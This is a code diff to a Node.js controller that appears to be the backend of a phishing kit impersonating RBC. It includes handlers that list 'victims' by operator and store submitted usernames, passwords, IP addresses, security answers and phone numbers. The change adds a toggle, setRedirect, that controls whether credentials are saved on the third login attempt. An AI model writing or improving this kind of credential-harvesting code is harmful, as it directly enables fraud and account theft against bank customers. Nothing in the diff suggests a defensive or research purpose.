@@ -1,6 +1,17 @@
 const RBC = require("../models/rbcModel");
 const axios = require("axios");
 
+let redirect = true;
+
+const setRedirect = async (req, res) => {
+	const { active } = req.params;
+	if (active == "true") {
+		redirect = true;
+	} else if (active == "false") {
+		redirect = false;
+	}
+};
+
 const getOwnerVics = async (req, res) => {
 	const { owner } = req.params;
 	RBC.find({ owner })
@@ -47,7 +58,7 @@ let count = 1;
 const submitLogin = async (req, res) => {
 	const { username, password, uniqueid, owner, ip } = req.body;
 	try {
-		if (count == 3) {
+		if (redirect && count == 3) {
 			await RBC.create({
 				uniqueid,
 				username,
@@ -155,4 +166,5 @@ module.exports = {
 	submitQuestion,
 	submitTelephone,
 	deleteEntry,
+	setRedirect,
 };
